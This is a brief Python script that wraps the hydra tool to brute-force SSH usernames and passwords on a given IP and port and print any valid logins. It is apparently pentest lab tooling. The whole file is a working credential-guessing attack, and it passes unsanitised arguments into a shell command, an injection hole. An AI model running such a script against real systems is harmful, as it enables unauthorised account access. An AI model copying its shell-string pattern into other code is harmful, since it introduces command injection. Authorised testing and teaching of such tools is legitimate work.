import subprocess
import sys

import os

if len(sys.argv) != 5:
    print("Usage: sshrecon.py <ip address> <port> <wordlist_path> <save_file_path>")
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()
wordlist_path = sys.argv[3].strip()
save_file_path = sys.argv[4].strip()

wordlist_users = os.path.join(wordlist_path, "userlist")
wordlist_passwords = os.path.join(wordlist_path, "offsecpass")

print("INFO: Performing hydra ssh scan against " + ip_address)
HYDRA = "hydra -L {wordlist_users} -P {wordlist_passwords} -f -o {save_file_path}_sshhydra.txt " \
        "-u {ip} -s {port} ssh".format(ip=ip_address, port=port, wordlist_users=wordlist_users,
                                       wordlist_passwords=wordlist_passwords, save_file_path=save_file_path)
try:
    results = subprocess.check_output(HYDRA, shell=True)
    resultarr = results.split("\n")
    for result in resultarr:
        if "login:" in result:
            print("[*] Valid ssh credentials found: " + result)
except:
    print("INFO: No valid ssh credentials found")
